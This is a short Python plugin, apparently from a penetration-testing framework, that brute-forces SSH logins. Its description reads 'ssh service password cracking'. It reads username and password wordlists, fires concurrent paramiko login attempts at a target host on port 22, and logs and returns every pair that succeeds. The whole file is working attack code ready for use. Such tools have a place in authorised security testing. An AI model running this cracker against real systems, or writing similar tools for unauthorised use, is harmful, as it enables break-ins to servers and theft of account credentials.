# -*-* coding:UTF-8
import os
import paramiko


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "ssh服务口令破解",
        "datetime": "2021-12-31"
    }

    def ip(self) -> dict:
        with self.async_pool(max_workers=self.target.setting.asyncio, threshold=self.threshold) as execute:
            for username, password in self.build_login_dict(
                    method=self.target.args.method,
                    username=self.target.args.username or os.path.join('data', 'ssh_username'),
                    password=self.target.args.password or os.path.join('data', 'ssh_password'),
            ):
                execute.submit(self.task, username, password)
            return {'LoginInfo': execute.result()}

    async def task(self, username, password):
        self.log.debug(f'Login => username: {username}, password: {password}')
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            hostname=self.target.value,
            port=22,
            username=username,
            password=password,
            timeout=self.target.args.timeout
        )
        ssh.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': 22,
            'server': 'ssh',
            'username': username,
            'password': password
        }
